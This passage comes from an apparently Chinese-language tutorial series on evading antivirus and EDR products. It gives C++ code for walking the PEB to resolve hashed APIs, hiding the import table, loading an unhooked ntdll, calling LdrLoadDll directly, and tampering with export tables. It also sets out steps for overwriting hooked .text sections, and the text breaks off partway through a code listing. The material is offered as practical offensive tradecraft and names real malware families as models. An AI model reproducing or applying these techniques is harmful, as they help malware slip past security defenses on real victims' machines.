class="hljs-number">0</span>) &#123;<br>            BYTE* base = (BYTE*)entry-&gt;DllBase;<br>            IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;<br>            IMAGE_NT_HEADERS*<br><br><br>nt = (IMAGE_NT_HEADERS*)(base + dos-&gt;e_lfanew);  <br>IMAGE_EXPORT_DIRECTORY* exports = (IMAGE_EXPORT_DIRECTORY*)  <br>(base + nt-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);<br><br><br>        DWORD* names = (DWORD*)(base + exports-&gt;AddressOfNames);<br>        WORD* ordinals = (WORD*)(base + exports-&gt;AddressOfNameOrdinals);<br>        DWORD* functions = (DWORD*)(base + exports-&gt;AddressOfFunctions);<br><br>        <span class="hljs-keyword">for</span> (DWORD i = <span class="hljs-number">0</span>; i &lt; exports-&gt;NumberOfNames; i++) &#123;<br>            <span class="hljs-type">char</span>* name = (<span class="hljs-type">char</span>*)(base + names[i]);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">HashFunction</span>(name) == functionHash) &#123;<br>                <span class="hljs-keyword">return</span> (FARPROC)(base + functions[ordinals[i]]);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;  <br><span class="hljs-comment">// 从kernel32.dll动态解析GetProcAddress  </span><br>DWORD hash = <span class="hljs-built_in">HashFunction</span>(<span class="hljs-string">&quot;GetProcAddress&quot;</span>);  <br>FARPROC getProc = <span class="hljs-built_in">GetFunctionAddressByPEB</span>(<span class="hljs-string">&quot;kernel32.dll&quot;</span>, hash);<br><br><br><span class="hljs-keyword">if</span> (getProc) &#123;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;解析的GetProcAddress: &quot;</span> &lt;&lt; getProc &lt;&lt; std::endl;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;解析失败。&quot;</span> &lt;&lt; std::endl;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br><br>&#125;<br><br></code></pre></td></tr></table></figure>

<hr>
<h3 id="它的作用："><a href="#它的作用：" class="headerlink" title="它的作用："></a><strong>它的作用：</strong></h3><ul>
<li><strong>避免使用LoadLibrary&#x2F;GetProcAddress</strong></li>
<li><strong>通过PEB查找<code>kernel32.dll</code></strong></li>
<li><strong>解析PE头部以定位导出表</strong></li>
<li><strong>通过哈希函数隐藏目标API的意图</strong></li>
<li><strong>返回解析的API目标地址</strong></li>
</ul>
<hr>
<h3 id="真实应用"><a href="#真实应用" class="headerlink" title="真实应用"></a><strong>真实应用</strong></h3><p><strong>APT恶意软件使用案例：</strong></p>
<ul>
<li>植入程序避免静态导入<code>VirtualAlloc</code>、<code>CreateThread</code>、<code>GetProcAddress</code>。</li>
<li>相反，它通过PEB解析在运行时解析它们。</li>
<li>这使得即使在静态AV&#x2F;EDR扫描中，恶意软件仍然可以执行，避免了对可疑导入的检测。</li>
</ul>
<p><strong>示例恶意软件家族：</strong></p>
<ul>
<li><strong>FIN7</strong> 和 <strong>APT41</strong> 在多个工具集中使用过这一技术。</li>
<li><strong>Cobalt Strike Beacon</strong> 加载器避免静态链接任何敏感API。</li>
</ul>
<hr>
<h3 id="检测影响"><a href="#检测影响" class="headerlink" title="检测影响"></a><strong>检测影响</strong></h3><table>
<thead>
<tr>
<th>技术</th>
<th>检测规避</th>
<th>可能的检测方式</th>
</tr>
</thead>
<tbody><tr>
<td>手动PE解析通过PEB</td>
<td>高</td>
<td>行为&#x2F;启发式</td>
</tr>
<tr>
<td>哈希查找API解析</td>
<td>高</td>
<td>内存扫描</td>
</tr>
<tr>
<td>使用自定义系统调用存根</td>
<td>非常高</td>
<td>内核级监控</td>
</tr>
</tbody></table>
<hr>
<h3 id="下一步"><a href="#下一步" class="headerlink" title="下一步"></a><strong>下一步</strong></h3><p>下一子模块（3.3）将探索如何：</p>
<ul>
<li>操控或混淆IAT条目</li>
<li>在自定义加载器中隐藏导入的API</li>
<li>通过自定义PE加载器绕过检测</li>
</ul>
<h2 id="AV-EDR规避实战技术-3-3-隐藏和混淆导入地址表（IAT）"><a href="#AV-EDR规避实战技术-3-3-隐藏和混淆导入地址表（IAT）" class="headerlink" title="AV&#x2F;EDR规避实战技术 - 3.3 - 隐藏和混淆导入地址表（IAT）"></a><strong>AV&#x2F;EDR规避实战技术 - 3.3 - 隐藏和混淆导入地址表（IAT）</strong></h2><p> <strong>简介</strong></p>
<p>导入地址表（IAT）是Windows可执行文件用来在运行时动态链接API的关键结构。由于它揭示了二进制文件所使用的API，因此它是<strong>静态分析</strong>和<strong>AV&#x2F;EDR扫描</strong>的主要目标。通过混淆或隐藏IAT，恶意软件变得更加难以检测。</p>
<hr>
<p> <strong>本技术的目标</strong></p>
<ul>
<li><p>避免在IAT中列出敏感API（例如，<code>VirtualAlloc</code>、<code>CreateRemoteThread</code>）。</p>
</li>
<li><p>绕过扫描静态导入的AV&#x2F;EDR。</p>
</li>
<li><p>允许使用更加隐蔽的方法在<strong>运行时解析</strong>必要的函数。</p>
</li>
</ul>
<hr>
<p> <strong>IAT混淆的关键技术</strong></p>
<h3 id="3-3-1-–-使用动态解析（没有导入部分）"><a href="#3-3-1-–-使用动态解析（没有导入部分）" class="headerlink" title="3.3.1 – 使用动态解析（没有导入部分）"></a><strong>3.3.1 – 使用动态解析（没有导入部分）</strong></h3><p>您可以编写一个没有导入部分的PE文件，并在运行时手动解析所需的所有API。这在shellcode加载器和加密器中很常见。</p>
<h4 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a><strong>示例代码</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// 手动解析kernel32.dll基址和GetProcAddress（简化版）</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-comment">// 定义自定义哈希函数以混淆API名称</span><br><span class="hljs-function">DWORD <span class="hljs-title">hash_djb2</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* str)</span> </span>&#123;<br>    DWORD hash = <span class="hljs-number">5381</span>;<br>    <span class="hljs-type">int</span> c;<br>    <span class="hljs-keyword">while</span> ((c = *str++)) &#123;<br>        hash = ((hash &lt;&lt; <span class="hljs-number">5</span>) + hash) + c;<br>    &#125;<br>    <span class="hljs-keyword">return</span> hash;<br>&#125;<br><br><span class="hljs-comment">// 手动解析API的示例</span><br><span class="hljs-function">FARPROC <span class="hljs-title">ResolveAPIByName</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* moduleName, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* functionName)</span> </span>&#123;<br>    HMODULE hMod = <span class="hljs-built_in">LoadLibraryA</span>(moduleName); <span class="hljs-comment">// 不是很隐蔽，但演示时使用此方法</span><br>    <span class="hljs-keyword">if</span> (!hMod) <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>    DWORD funcHash = <span class="hljs-built_in">hash_djb2</span>(functionName);<br>    FARPROC addr = <span class="hljs-built_in">GetProcAddress</span>(hMod, functionName); <span class="hljs-comment">// 在真实规避中，您需要手动解析</span><br><br>    <span class="hljs-keyword">return</span> addr;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">auto</span> VirtualAllocPtr = (<span class="hljs-built_in">LPVOID</span>(WINAPI*)(LPVOID, SIZE_T, DWORD, DWORD))<span class="hljs-built_in">ResolveAPIByName</span>(<span class="hljs-string">&quot;kernel32.dll&quot;</span>, <span class="hljs-string">&quot;VirtualAlloc&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (VirtualAllocPtr) &#123;<br>        <span class="hljs-type">void</span>* mem = <span class="hljs-built_in">VirtualAllocPtr</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">1024</span>, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;内存分配地址: &quot;</span> &lt;&lt; mem &lt;&lt; std::endl;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>在真实世界的规避案例中：</p>
<ul>
<li><p><code>LoadLibraryA</code> 和 <code>GetProcAddress</code> 也会通过PEB解析。</p>
</li>
<li><p>字符串会被加密或存储为哈希。</p>
</li>
<li><p>会使用手动解析的PE导出目录。</p>
</li>
</ul>
<hr>
<h3 id="3-3-2-–-加密IAT并在运行时解密"><a href="#3-3-2-–-加密IAT并在运行时解密" class="headerlink" title="3.3.2 – 加密IAT并在运行时解密"></a><strong>3.3.2 – 加密IAT并在运行时解密</strong></h3><p>另一种规避方法是加密IAT部分，并在使用API之前在内存中解密。这增加了复杂性并避免了通过静态分析检测IAT。</p>
<h4 id="真实世界场景"><a href="#真实世界场景" class="headerlink" title="真实世界场景"></a><strong>真实世界场景</strong></h4><ul>
<li><p><strong>Dridex木马</strong>家族使用过部分IAT混淆。</p>
</li>
<li><p><strong>加壳的投放程序</strong>通常会实现这种技术以防止沙箱提取。</p>
</li>
</ul>
<hr>
<h3 id="3-3-3-–-自定义加载器无标准PE头部"><a href="#3-3-3-–-自定义加载器无标准PE头部" class="headerlink" title="3.3.3 – 自定义加载器无标准PE头部"></a><strong>3.3.3 – 自定义加载器无标准PE头部</strong></h3><p>恶意软件可以作为shellcode或包含在自定义PE加载器中的形式传递，且该加载器：</p>
<ul>
<li><p>不使用操作系统加载程序。</p>
</li>
<li><p>手动解析头部。</p>
</li>
<li><p>手动解析所有导入。</p>
</li>
<li><p>避免将条目放入标准导入表。</p>
</li>
</ul>
<p>此技术由以下软件使用：</p>
<ul>
<li><p><strong>Cobalt Strike Beacon加载器</strong></p>
</li>
<li><p><strong>Metasploit自定义可执行文件</strong></p>
</li>
<li><p><strong>APT恶意软件投放程序</strong></p>
</li>
</ul>
<hr>
<h3 id="3-3-4-–-API踏印（覆盖IAT）"><a href="#3-3-4-–-API踏印（覆盖IAT）" class="headerlink" title="3.3.4 – API踏印（覆盖IAT）"></a><strong>3.3.4 – API踏印（覆盖IAT）</strong></h3><p>在解析一个API后，恶意软件可以用指向以下内容的指针覆盖IAT条目：</p>
<ul>
<li><p>另一个函数。</p>
</li>
<li><p>自定义包装器或跳板。</p>
</li>
<li><p>垃圾数据以误导分析工具。</p>
</li>
</ul>
<p>此技术需要：</p>
<ul>
<li><p>对IAT部分（<code>.idata</code>）有写入权限。</p>
</li>
<li><p>小心地进行重定向以避免崩溃。</p>
</li>
</ul>
<hr>
<p> <strong>检测与规避矩阵</strong></p>
<table>
<thead>
<tr>
<th>技术</th>
<th>静态检测风险</th>
<th>运行时检测风险</th>
</tr>
</thead>
<tbody><tr>
<td>正常IAT使用</td>
<td>高</td>
<td>低</td>
</tr>
<tr>
<td>手动API解析（PEB）</td>
<td>低</td>
<td>中（启发式）</td>
</tr>
<tr>
<td>IAT加密</td>
<td>非常低</td>
<td>高（内存扫描）</td>
</tr>
<tr>
<td>自定义加载器 &#x2F; shellcode</td>
<td>非常低</td>
<td>中</td>
</tr>
</tbody></table>
<hr>
<p> <strong>关键考虑因素</strong></p>
<ul>
<li><p><strong>混淆只会延迟检测</strong>，它并不能永久阻止检测。</p>
</li>
<li><p>结合多种技术（PEB遍历 + IAT加密）会更有效。</p>
</li>
<li><p>使用<strong>延迟执行</strong>、<strong>环境检查</strong>和<strong>系统调用</strong>能提高规避成功率。</p>
</li>
</ul>
<h2 id="AV-EDR规避实战技术-3-4-API转发、钩子绕过和导出表篡改"><a href="#AV-EDR规避实战技术-3-4-API转发、钩子绕过和导出表篡改" class="headerlink" title="AV&#x2F;EDR规避实战技术 - 3.4 - API转发、钩子绕过和导出表篡改"></a><strong>AV&#x2F;EDR规避实战技术 - 3.4 - API转发、钩子绕过和导出表篡改</strong></h2><p> <strong>简介</strong></p>
<p>AV&#x2F;EDR解决方案通常会钩住Windows的关键API函数以监控或阻止恶意活动。然而，存在一些高级技术可以<strong>绕过用户态钩子</strong>、<strong>混淆导入解析器</strong>，或者<strong>篡改导出表</strong>，以重定向或掩盖执行流程。</p>
<p>本节探讨三种关键策略：</p>
<ol>
<li><p><strong>API转发</strong>（合法与恶意使用）</p>
</li>
<li><p><strong>钩子绕过</strong>（例如，调用未被钩住的API，直接调用系统调用）</p>
</li>
<li><p><strong>导出表篡改</strong>（恶意操作）</p>
</li>
</ol>
<hr>
<h3 id="3-4-1-–-API转发"><a href="#3-4-1-–-API转发" class="headerlink" title="3.4.1 – API转发"></a><strong>3.4.1 – API转发</strong></h3><p> <strong>什么是API转发？</strong></p>
<p>API转发是指在DLL中<strong>导出的函数指向另一个DLL中的函数</strong>，这是Windows中常见的模块化功能实现方式。</p>
<p><strong>示例：</strong></p>
<ul>
<li><code>KERNEL32!HeapAlloc</code> 会转发到 <code>NTDLL!RtlAllocateHeap</code></li>
</ul>
<p>恶意软件可以利用这种行为来：</p>
<ul>
<li><p>间接解析API。</p>
</li>
<li><p>查找未被钩住的目标。</p>
</li>
<li><p>通过直接调用低级API来绕过用户态钩子。</p>
</li>
</ul>
<p> <strong>代码示例：通过 <code>ntdll</code> 转发</strong></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">LPVOID</span> <span class="hljs-params">(WINAPI *pVirtualAlloc)</span><span class="hljs-params">(LPVOID, SIZE_T, DWORD, DWORD)</span></span>;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    HMODULE ntdll = <span class="hljs-built_in">LoadLibraryA</span>(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br><br>    <span class="hljs-comment">// 解析真实的实现，绕过 kernel32 的包装</span><br>    FARPROC allocReal = <span class="hljs-built_in">GetProcAddress</span>(ntdll, <span class="hljs-string">&quot;NtAllocateVirtualMemory&quot;</span>);<br><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;NtAllocateVirtualMemory resolved at: &quot;</span> &lt;&lt; allocReal &lt;&lt; std::endl;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>此方法也可以结合<strong>手动系统调用</strong>使用（如在模块2.7中所示）。</p>
<hr>
<h3 id="3-4-2-–-钩子绕过技术"><a href="#3-4-2-–-钩子绕过技术" class="headerlink" title="3.4.2 – 钩子绕过技术"></a><strong>3.4.2 – 钩子绕过技术</strong></h3><p>EDR常常钩住高风险的API（例如<code>CreateRemoteThread</code>）来监控进程活动，使用以下方式：</p>
<ul>
<li><p>IAT修补</p>
</li>
<li><p>内联修补（覆盖函数前言）</p>
</li>
<li><p>跳板技术（重定向）</p>
</li>
</ul>
<p> <strong>绕过策略</strong></p>
<ul>
<li><p><strong>PEB遍历</strong>：通过PEB手动解析API，避免触发标准的API解析。</p>
</li>
<li><p><strong>直接系统调用</strong>：完全绕过用户态。</p>
</li>
<li><p><strong>加载未被钩住的DLL副本</strong>：</p>
<ul>
<li><p>使用<code>LoadLibrary</code>加载一个干净的DLL。</p>
</li>
<li><p>通过内存段（<code>.text</code>）查找未修补的副本。</p>
</li>
</ul>
</li>
</ul>
<p> <strong>示例：加载干净的<code>ntdll.dll</code></strong></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-comment">// 加载一个干净的、未被钩住的ntdll.dll</span><br><span class="hljs-function">HMODULE <span class="hljs-title">LoadCleanNtdll</span><span class="hljs-params">()</span> </span>&#123;<br>    HMODULE hNtdll = <span class="hljs-literal">NULL</span>;<br>    WCHAR path[MAX_PATH];<br>    <span class="hljs-built_in">GetSystemDirectoryW</span>(path, MAX_PATH);<br>    <span class="hljs-built_in">wcscat_s</span>(path, <span class="hljs-string">L&quot;\\ntdll.dll&quot;</span>);<br><br>    hNtdll = <span class="hljs-built_in">LoadLibraryExW</span>(path, <span class="hljs-literal">NULL</span>, DONT_RESOLVE_DLL_REFERENCES);<br>    <span class="hljs-keyword">return</span> hNtdll;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这通常被像<strong>TrickBot</strong>和<strong>Cobalt Strike加载器</strong>等恶意软件用来查找<strong>干净的<code>.text</code>部分</strong>，将其覆盖被钩住的部分，或者寻找干净的系统调用存根。</p>
<hr>
<h3 id="3-4-3-–-导出表篡改"><a href="#3-4-3-–-导出表篡改" class="headerlink" title="3.4.3 – 导出表篡改"></a><strong>3.4.3 – 导出表篡改</strong></h3><p> <strong>为什么要篡改导出表？</strong></p>
<p>一些打包器和加密器会修改<strong>导出地址表（EAT）</strong>来：</p>
<ul>
<li><p>用虚假的存根替换导出函数。</p>
</li>
<li><p>重定向到加密或运行时生成的代码。</p>
</li>
<li><p>在静态检查期间混淆AV&#x2F;EDR。</p>
</li>
</ul>
<p> <strong>示例：在内存中重写导出表</strong></p>
<p>尽管复杂且在C&#x2F;C++中很少直接使用，但可以通过以下方式实现：</p>
<ul>
<li><p>自定义PE加载器</p>
</li>
<li><p>反射加载shellcode</p>
</li>
<li><p>手动PE映射</p>
</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// 伪代码（不完整）</span><br>PIMAGE_EXPORT_DIRECTORY exports = <span class="hljs-built_in">GetExportDirectory</span>(moduleBase);<br><br><span class="hljs-comment">// 修改 AddressOfFunctions 表</span><br>exports-&gt;AddressOfFunctions[index] = RVA_to_YourCustomStub;<br><br><span class="hljs-comment">// 或者，清空整个导出目录，打破静态分析</span><br><span class="hljs-built_in">ZeroMemory</span>(exports, <span class="hljs-built_in">sizeof</span>(IMAGE_EXPORT_DIRECTORY));<br></code></pre></td></tr></table></figure>

<p>这种技术在<strong>无文件恶意软件</strong>和<strong>阶段0加密器</strong>中常见，目的是混淆反汇编工具或AV启发式检测。</p>
<hr>
<p> <strong>真实世界的恶意软件技术</strong></p>
<table>
<thead>
<tr>
<th>恶意软件家族</th>
<th>使用的技术</th>
</tr>
</thead>
<tbody><tr>
<td>Dridex</td>
<td>动态IAT解析，字符串哈希</td>
</tr>
<tr>
<td>TrickBot</td>
<td>手动系统调用解析，IAT篡改</td>
</tr>
<tr>
<td>Cobalt Strike</td>
<td>反射DLL加载，导出表篡改</td>
</tr>
<tr>
<td>APT恶意软件</td>
<td>PEB遍历，系统调用重定向</td>
</tr>
</tbody></table>
<hr>
<p> <strong>关键要点</strong></p>
<ul>
<li><p>API解析方法对于规避非常关键。</p>
</li>
<li><p>混淆或绕过导入解析可以有效规避静态和运行时检测。</p>
</li>
<li><p>高级规避技术结合使用系统调用、导出篡改、IAT混淆和内存技巧。</p>
</li>
</ul>
<hr>
<h3 id="3-4-4-–-使用-LdrLoadDll-进行隐蔽DLL加载"><a href="#3-4-4-–-使用-LdrLoadDll-进行隐蔽DLL加载" class="headerlink" title="3.4.4 – 使用 LdrLoadDll 进行隐蔽DLL加载"></a><strong>3.4.4 – 使用 <code>LdrLoadDll</code> 进行隐蔽DLL加载</strong></h3><p><code>LoadLibrary</code> 是一个常见的EDR钩子目标，而恶意软件通常直接使用 <code>ntdll!LdrLoadDll</code> 来绕过用户态拦截。</p>
<h4 id="示例：LdrLoadDll-来自NTDLL"><a href="#示例：LdrLoadDll-来自NTDLL" class="headerlink" title="示例：LdrLoadDll 来自NTDLL"></a><strong>示例：<code>LdrLoadDll</code> 来自NTDLL</strong></h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;winternl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span> <span class="hljs-params">(NTAPI* _LdrLoadDll)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    PWCHAR PathToFile,</span></span><br><span class="hljs-params"><span class="hljs-function">    ULONG Flags,</span></span><br><span class="hljs-params"><span class="hljs-function">    PUNICODE_STRING ModuleFileName,</span></span><br><span class="hljs-params"><span class="hljs-function">    PHANDLE ModuleHandle</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">LoadDLLUsingLdr</span><span class="hljs-params">()</span> </span>&#123;<br>    _LdrLoadDll LdrLoadDll = (_LdrLoadDll)<span class="hljs-built_in">GetProcAddress</span>(<span class="hljs-built_in">GetModuleHandle</span>(<span class="hljs-string">L&quot;ntdll.dll&quot;</span>), <span class="hljs-string">&quot;LdrLoadDll&quot;</span>);<br><br>    UNICODE_STRING ustr;<br>    <span class="hljs-built_in">RtlInitUnicodeString</span>(&amp;ustr, <span class="hljs-string">L&quot;kernel32.dll&quot;</span>);<br>    HANDLE hModule = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-built_in">LdrLoadDll</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;ustr, &amp;hModule);<br><br>    std::wcout &lt;&lt; <span class="hljs-string">L&quot;Loaded module: &quot;</span> &lt;&lt; hModule &lt;&lt; std::endl;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>为什么它规避EDR</strong>：EDR钩子通常安装在 <code>LoadLibraryA/W</code>，而 <code>LdrLoadDll</code> 是一个<strong>底层</strong>的内部函数，可以避免许多检测。</p>
<hr>
<h3 id="3-4-5-–-使用-LdrGetProcedureAddress-解析API"><a href="#3-4-5-–-使用-LdrGetProcedureAddress-解析API" class="headerlink" title="3.4.5 – 使用 LdrGetProcedureAddress 解析API"></a><strong>3.4.5 – 使用 <code>LdrGetProcedureAddress</code> 解析API</strong></h3><p>DLL加载后，可以通过以下方法手动解析函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span> <span class="hljs-params">(NTAPI* _LdrGetProcedureAddress)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">    PANSI_STRING FunctionName,</span></span><br><span class="hljs-params"><span class="hljs-function">    WORD Ordinal,</span></span><br><span class="hljs-params"><span class="hljs-function">    PVOID* FunctionAddress</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure>

<p>这种方式完全绕过了 <code>GetProcAddress</code>，后者是另一个常见的钩子目标。</p>
<hr>
<h3 id="3-4-6-–-覆盖钩住的-text-部分"><a href="#3-4-6-–-覆盖钩住的-text-部分" class="headerlink" title="3.4.6 – 覆盖钩住的 .text 部分"></a><strong>3.4.6 – 覆盖钩住的 <code>.text</code> 部分</strong></h3><p>AV&#x2F;EDR经常在已加载模块的 <code>.text</code> 部分注入跳板钩子（如 <code>ntdll.dll</code>、<code>kernel32.dll</code>）。一种经典技术是：</p>
<ol>
<li><p>使用 <code>CreateFile</code> 和 <code>ReadFile</code> 从磁盘加载一个干净的DLL。</p>
</li>
<li><p>解析PE头。</p>
</li>
<li><p>提取干净的 <code>.text</code> 部分。</p>
</li>
<li><p>使用干净的版本覆盖内存中的已钩住 <code>.text</code>。</p>
</li>
</ol>
<h4 id="示例（简化版）："><a href="#示例（简化版）：" class="headerlink" title="示例（简化版）："></a><strong>示例（简化版）</strong>：</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span 